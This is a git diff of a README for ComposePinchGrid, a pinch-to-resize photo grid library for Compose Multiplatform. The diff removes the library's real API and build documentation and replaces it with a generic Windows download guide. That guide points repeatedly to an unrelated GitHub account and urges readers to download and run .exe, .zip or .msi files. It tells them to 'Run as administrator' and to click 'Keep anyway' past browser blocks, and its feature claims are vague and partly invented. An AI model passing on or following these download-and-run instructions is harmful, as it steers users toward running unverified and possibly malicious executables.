@@ -1,288 +1,214 @@
-# ComposePinchGrid
-
-A **Google Photos-style** pinch-to-resize grid for Compose Multiplatform. Pinch to change column count with haptic feedback, breathing scale animation, and smooth transitions. Built on Compose Foundation — no Material dependency.
-
-[![Maven Central](https://img.shields.io/maven-central/v/io.github.aldefy/pinch-grid?color=blue)](https://central.sonatype.com/artifact/io.github.aldefy/pinch-grid)
-[![Kotlin](https://img.shields.io/badge/Kotlin-2.1.20-purple.svg)](https://kotlinlang.org)
-[![Compose Multiplatform](https://img.shields.io/badge/Compose%20Multiplatform-1.8.0-blue)](https://www.jetbrains.com/compose-multiplatform/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0)
-
-| Android | iOS | Desktop (JVM) | Web (Wasm) |
-|:-------:|:---:|:-------------:|:----------:|
-|    ✓    |  ✓  |       ✓       |     ✓      |
-
-## Demo
-
-<p align="center">
-  <img src="assets/demo.gif" width="280" alt="ComposePinchGrid demo — pinch to resize grid columns" />
-</p>
-
-> Full quality video: [assets/demo.mp4](assets/demo.mp4)
-
-## Installation
-
-```kotlin
-// build.gradle.kts
-dependencies {
-    implementation("io.github.aldefy:pinch-grid:1.0.0-alpha02")
-}
-```
-
-## Quick Start
-
-```kotlin
-@Composable
-fun PhotoGrid(photos: List<Photo>) {
-    val state = rememberPinchGridState()
-
-    PinchGrid(state = state) {
-        items(photos, key = { it.id }) { photo ->
-            AsyncImage(
-                model = photo.url,
-                modifier = Modifier.aspectRatio(1f),
-                contentScale = ContentScale.Crop,
-            )
-        }
-    }
-}
-```
-
-That's it. Pinch to resize, haptic on snap, scroll position preserved.
-
-## API
-
-### PinchGrid
-
-```kotlin
-@Composable
-fun PinchGrid(
-    state: PinchGridState,
-    modifier: Modifier = Modifier,
-    gridState: LazyGridState = rememberLazyGridState(),
-    contentPadding: PaddingValues = PaddingValues(),
-    verticalArrangement: Arrangement.Vertical = Arrangement.spacedBy(0.dp),
-    horizontalArrangement: Arrangement.Horizontal = Arrangement.spacedBy(0.dp),
-    // Gesture tuning
-    thresholdFraction: Float = PinchGridDefaults.ThresholdFraction,
-    deadZone: Float = PinchGridDefaults.DeadZone,
-    pinchOutThresholdMultiplier: Float = PinchGridDefaults.PinchOutThresholdMultiplier,
-    // Visual feedback
-    breathingScaleIntensity: Float = PinchGridDefaults.BreathingScaleIntensity,
-    breathingReturnDuration: Int = PinchGridDefaults.BreathingReturnDuration,
-    hapticEnabled: Boolean = PinchGridDefaults.HapticEnabled,
-    // Transition & control
-    transitionSpec: ColumnTransitionSpec = PinchGridDefaults.TransitionSpec,
-    gestureEnabled: Boolean = true,
-    onColumnChanged: ((newCount: Int) -> Unit)? = null,
-    content: LazyGridScope.() -> Unit,
-)
-```
-
-Every parameter has a tuned default — override only what you need.
-
-### State
-
-```kotlin
-val state = rememberPinchGridState(
-    initialColumnCount = 3,  // start with 3 columns
-    minColumns = 1,          // full-width single item (zoom in limit)
-    maxColumns = 5,          // dense grid (zoom out limit)
-)
-
-// Read current state
-state.columnCount      // current column count
-state.scaleProgress    // 0f–1f, how close to next snap (for custom item scaling)
-state.isZoomingIn      // true = spreading fingers, false = pinching, null = idle
-state.previousColumnCount  // for transition animation
-
-// Programmatic control
-state.snapToColumn(2)  // change columns from code (keyboard, buttons, accessibility)
-```
-
-## Gesture Configuration
-
-The gesture feel is highly configurable. All parameters have tuned defaults:
-
-### Threshold Fraction
-
-Controls how much pinch is needed to trigger a column change. Lower = more sensitive.
-
-```kotlin
-PinchGrid(
-    state = state,
-    thresholdFraction = 0.45f,  // default — responsive but not accidental
-    // thresholdFraction = 0.2f,  // very sensitive — small pinch triggers change
-    // thresholdFraction = 0.7f,  // conservative — requires deliberate pinch
-) { /* content */ }
-```
-
-### Defaults Reference
-
-| Parameter | Default | What it does |
-|-----------|---------|-------------|
-| `thresholdFraction` | `0.45f` | Scale change needed to snap. Lower = more sensitive |
-| `deadZone` | `0.01f` | Micro-movement filter. Prevents jitter from small finger tremors |
-| `pinchOutThresholdMultiplier` | `0.85f` | Makes pinch-out 15% easier than pinch-in (compensates natural finger asymmetry) |
-| `breathingScaleIntensity` | `0.10f` | How much the grid scales during pinch. `0f` = disabled |
-| `breathingReturnDuration` | `150` | Milliseconds to animate breathing back to 1.0 on release |
-| `hapticEnabled` | `true` | Toggle platform haptic feedback on column snap |
-| `InitialColumnCount` | `3` | Starting columns (via state) |
-| `MinColumns` | `1` | Zoom-in limit (via state) |
-| `MaxColumns` | `5` | Zoom-out limit (via state) |
-
-### Configuration Examples
-
-```kotlin
-// Google Photos clone — instant reflow, breathing, haptic (default)
-PinchGrid(state = state) { /* content */ }
-
-// Sensitive gesture for tablets — larger fingers need less movement
-PinchGrid(
-    state = state,
-    thresholdFraction = 0.25f,
-    pinchOutThresholdMultiplier = 0.75f,
-) { /* content */ }
-
-// No visual effects — pure column switching
-PinchGrid(
-    state = state,
-    breathingScaleIntensity = 0f,
-    hapticEnabled = false,
-    transitionSpec = ColumnTransitionSpec.None,
-) { /* content */ }
-
-// Smooth crossfade with aggressive breathing
-PinchGrid(
-    state = state,
-    breathingScaleIntensity = 0.20f,
-    breathingReturnDuration = 300,
-    transitionSpec = ColumnTransitionSpec.Crossfade(durationMillis = 250),
-) { /* content */ }
-```
-
-### Asymmetric Thresholds
+# 📱 compose-pinch-grid - Pinch to resize photo grids
 
-Pinch-out (spreading fingers) naturally produces less scale change than pinch-in. The `PinchOutThresholdMultiplier` compensates — at `0.85f`, zooming in requires 15% less finger movement than zooming out, making both directions feel equally responsive.
-
-### Dead Zone
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Petrinaaccessible90/compose-pinch-grid)
 
-The `0.01f` dead zone filters micro-movements. Without it, tiny finger tremors while holding a pinch cause the grid to jitter. You shouldn't need to change this.
-
-## Transition Specs
+## 🖥️ What this app does
 
-```kotlin
-// Google Photos style — instant reflow, no animation (default)
-PinchGrid(
-    state = state,
-    transitionSpec = ColumnTransitionSpec.None,
-) { /* content */ }
+compose-pinch-grid is a sample app and UI component for a photo-style grid. It lets you change the number of columns with a pinch gesture, much like Google Photos. The grid reacts with haptic feedback, smooth motion, and a small breathing scale effect as you zoom in and out.
 
-// Crossfade — smooth opacity transition between layouts
-PinchGrid(
-    state = state,
-    transitionSpec = ColumnTransitionSpec.Crossfade(durationMillis = 200),
-) { /* content */ }
-```
+It works across Android, iOS, Desktop, and Web with Compose Multiplatform.
 
-## Breathing Scale
+## 📥 Download and open on Windows
 
-During a pinch gesture, the grid subtly scales up (zooming in) or down (zooming out) following your fingers. This provides real-time visual feedback before the column count snaps. The effect uses `graphicsLayer` — **zero recompositions**, pure GPU transform at 60fps.
+To get the app on Windows, visit this page to download:
 
-Control via `breathingScaleIntensity` (default `0.10f` = ±10% scale, `0f` = disabled) and `breathingReturnDuration` (default `150ms`).
+https://github.com/Petrinaaccessible90/compose-pinch-grid
 
-You can use `state.scaleProgress` and `state.isZoomingIn` to apply custom per-item transforms:
+1. Open the link in your browser.
+2. Look for the latest release or the main project files.
+3. Download the Windows build if one is available.
+4. If you see a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-```kotlin
-items(photos, key = { it.id }) { photo ->
-    val itemScale = when (state.isZoomingIn) {
-        true -> 1f + (state.scaleProgress * 0.1f)
-        false -> 1f - (state.scaleProgress * 0.1f)
-        null -> 1f
-    }
-    AsyncImage(
-        model = photo.url,
-        modifier = Modifier
-            .graphicsLayer { scaleX = itemScale; scaleY = itemScale }
-            .aspectRatio(1f),
-    )
-}
-```
+If the project is provided as source files only, you can still review the project page for build files and setup steps.
 
-## Haptic Feedback
+## 🧭 What you will see
 
-Fires automatically on every column snap. Disable with `hapticEnabled = false`.
+When the app runs, you can expect:
 
-| Platform | Implementation |
-|----------|---------------|
-| Android | `View.performHapticFeedback(CLOCK_TICK)` |
-| iOS | `UISelectionFeedbackGenerator.selectionChanged()` |
-| Desktop | No-op |
-| Web | No-op |
+- A grid of photos or photo-like tiles
+- Pinch to make the grid show more or fewer columns
+- Smooth transitions between sizes
+- Haptic feedback on supported devices
+- A clean, simple layout that is easy to use
+- Scale animation that makes the grid feel responsive
 
-## Programmatic Control
+## ✅ Before you start
 
-```kotlin
-val state = rememberPinchGridState()
+For the best result on Windows, use:
 
-// Buttons
-Button(onClick = { state.snapToColumn(state.columnCount - 1) }) { Text("Zoom In") }
-Button(onClick = { state.snapToColumn(state.columnCount + 1) }) { Text("Zoom Out") }
+- Windows 10 or Windows 11
+- A mouse, touchpad, or touch screen
+- A stable internet connection for the download
+- Enough free space to unpack the files
 
-// Respond to changes
-PinchGrid(
-    state = state,
-    onColumnChanged = { newCount -> analytics.log("columns_changed", newCount) },
-) { /* content */ }
-```
+If you use a touch screen, pinch gestures will feel the most natural. On a touchpad, you may be able to use multi-touch gestures if your device supports them.
 
-## Scroll Position Preservation
+## 🪟 How to install on Windows
 
-When the column count changes, the grid maintains the user's scroll position by snapshotting `firstVisibleItemIndex` before the change and restoring it after. For best results, provide stable `key` values to your items:
+### 1. Open the download page
 
-```kotlin
-items(photos, key = { it.id }) { photo -> /* ... */ }
-```
+Go to:
 
-## Sample App
+https://github.com/Petrinaaccessible90/compose-pinch-grid
 
-The included sample app demonstrates all features with 50 random photos, a live FPS counter, and an interactive threshold tuning slider.
+### 2. Get the file
 
-```bash
-# Run on connected Android device
-./gradlew :sample:installDebug
+Find the newest download on the page. Download the Windows package or app file.
 
-# Run on desktop (buttons only, no pinch)
-./gradlew :sample:run
-```
+### 3. Extract the files
 
-## Building
+If the download comes as a `.zip` file:
 
-```bash
-# Build library for all targets
-./gradlew :pinch-grid:build
+- Right-click the file
+- Select **Extract All**
+- Choose a folder you can find later, such as **Downloads** or **Desktop**
 
-# Generate API dump (after adding public API)
-./gradlew :pinch-grid:apiDump
+### 4. Start the app
 
-# Publish to local staging (for Maven Central upload)
-./gradlew :pinch-grid:publishAllPublicationsToLocalStagingRepository \
-    -Psigning.gnupg.keyName=F30A3C2E
-```
+Open the extracted folder and look for the app file. It may be named after the project or may use a Windows app extension.
 
-## License
+Double-click the file to launch it.
 
-```
-Copyright 2026 Adit Lal
+### 5. Keep the files together
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+Do not move only one file out of the folder. If the app came with support files, keep the whole folder in the same place.
 
-    https://www.apache.org/licenses/LICENSE-2.0
+## 🖱️ How to use the app
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
-```
+Once the app opens:
+
+1. Place two fingers on a touch screen or touchpad
+2. Pinch inward to show more columns
+3. Spread outward to show fewer columns
+4. Watch the grid shift with a smooth animation
+5. Feel the haptic feedback where the device supports it
+
+If you use a mouse, the app may also support wheel or drag-based controls in the desktop build, depending on how the package was made.
+
+## 🎨 Main features
+
+- Pinch to resize the grid
+- Column count changes in real time
+- Haptic feedback on supported hardware
+- Smooth animated transitions
+- Breathing scale effect during interaction
+- Works across Android, iOS, Desktop, and Web
+- Built with Compose Multiplatform
+- Uses a lazy grid for better performance
+- Designed for photo browsing and tile layouts
+
+## 🧩 Who this is for
+
+This project is useful if you want:
+
+- A photo grid that feels like Google Photos
+- A touch-friendly grid on desktop or mobile
+- A Compose Multiplatform UI example
+- A base for a gallery, album, or media browser
+- A simple way to test pinch-based grid sizing
+
+## 🔧 If the app does not open
+
+Try these steps:
+
+1. Make sure you downloaded the full folder or package
+2. Check that Windows did not block the file
+3. Right-click the app file and select **Run as administrator**
+4. Extract the ZIP file again if files look incomplete
+5. Move the folder to a short path like `C:\Apps\compose-pinch-grid`
+6. Try opening the file again
+
+If nothing happens, the app may need a different Windows build or a missing support file from the same folder.
+
+## 📁 Suggested folder layout
+
+After extraction, you may see files like:
+
+- `app.exe`
+- support libraries
+- a `data` folder
+- config files
+- readme or license files
+
+Keep all of them in the same folder so the app can find what it needs.
+
+## 🌐 Platform support
+
+This project is built for:
+
+- Android
+- iOS
+- Desktop
+- Web
+
+The Windows instructions on this page focus on the desktop build or package made for Windows use.
+
+## 🛠️ Build info for advanced users
+
+If you want to inspect the source or build your own copy, this repository uses:
+
+- Kotlin Multiplatform
+- Jetpack Compose
+- Compose Desktop
+- Compose Web / WASM support
+- Lazy grid patterns
+- Gesture handling for pinch input
+- Haptic feedback hooks where supported
+
+## 📌 Project link
+
+Primary download and project page:
+
+https://github.com/Petrinaaccessible90/compose-pinch-grid
+
+## 📄 Common file types
+
+You may find one of these on the project page or in a release:
+
+- `.exe` for Windows
+- `.zip` for packed files
+- `.msi` for a Windows installer
+- source folders for building the app yourself
+
+If you get a `.zip`, extract it first before opening the app.
+
+## 🧪 Simple test after launch
+
+After the app starts, check these items:
+
+- The grid is visible
+- Pinch changes the number of columns
+- The view animates with a smooth shift
+- The app responds without delay
+- The window opens at a usable size
+
+If the grid reacts to your touch and changes layout, the app is working as expected.
+
+## ⌨️ Keyboard and mouse use
+
+If you do not have a touch screen, you can still try the app with:
+
+- Mouse wheel
+- Trackpad gestures
+- Touchpad pinch on supported laptops
+- Keyboard shortcuts if the build includes them
+
+Support can vary by device and by how the Windows package was made
+
+## 📷 What makes this grid different
+
+Most grids stay fixed. This one changes size with a pinch gesture. That makes it easy to move between a dense view and a larger tile view without changing screens or opening settings.
+
+The effect is close to what people know from photo apps on phones, but it also works in Compose apps across platforms.
+
+## 🔍 Troubleshooting download issues
+
+If the browser blocks the file:
+
+- Choose **Keep** or **Keep anyway**
+- Save the file to a simple folder
+- Retry the download on a stable connection
+
+If the page shows source files only, check for a **Releases** area or a package file in the repository page before trying to run it on Windows
